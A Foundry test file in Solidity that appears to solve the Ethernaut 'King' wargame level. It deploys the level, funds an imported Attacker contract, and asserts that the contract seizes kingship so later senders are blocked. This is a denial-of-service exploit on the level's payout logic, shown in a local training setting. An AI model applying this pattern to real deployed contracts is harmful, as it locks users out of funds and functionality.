// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/09-King/KingFactory.sol";
import "src/09-King/Attacker.sol";

contract BaseSetUp is Test {
    Ethernaut ethernaut;
    address payable attacker;
    address payable randomUser;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attacker = payable(vm.addr(1));      
        vm.deal(attacker, 10 ether);
        vm.label(attacker, "Attacker");

        // Initialize random EOA
        randomUser = payable(vm.addr(2));      
        vm.deal(randomUser, 10 ether);
        vm.label(randomUser, "Random User");
    }

}

contract Attack is BaseSetUp {

    King ethernautKing;
    Attacker attackerContract;
    address payable levelAddress;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        // Initialize level
        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);

        vm.prank(attacker);
        levelAddress = payable(ethernaut.createLevelInstance{value: 1 ether}(kingFactory));
        ethernautKing = King(levelAddress);
        console.log("Ethernaut King Challenge!");
    }
    
    function testAttack() public {

        // Random user tries to become king before the attack
        vm.prank(randomUser);
        (bool success, ) = address(ethernautKing).call{value: 1.1 ether}("");
        assert(randomUser == ethernautKing._king());
        emit log_named_address("initial king", ethernautKing._king());
        emit log_named_uint("initial prize", ethernautKing.prize());
        

        vm.startPrank(attacker);

        // Initialize and fund attackerContract. As soon as the contract is funded will become King
        attackerContract = new Attacker(levelAddress);
        (success, ) = address(attackerContract).call{value: 10 ether}("");

        attackerContract.becomeKing(1.2 ether);
        emit log_named_address("attack king", ethernautKing._king());
        emit log_named_uint("attack prize", ethernautKing.prize());
        assert(address(attackerContract) == ethernautKing._king());

        vm.stopPrank();
        

        // Random user tries to become king but fails
        vm.prank(randomUser);
        (success, ) = address(ethernautKing).call{value: 6 ether}("");
        assert(randomUser != ethernautKing._king());
        assert(address(attackerContract) == ethernautKing._king());
    }
}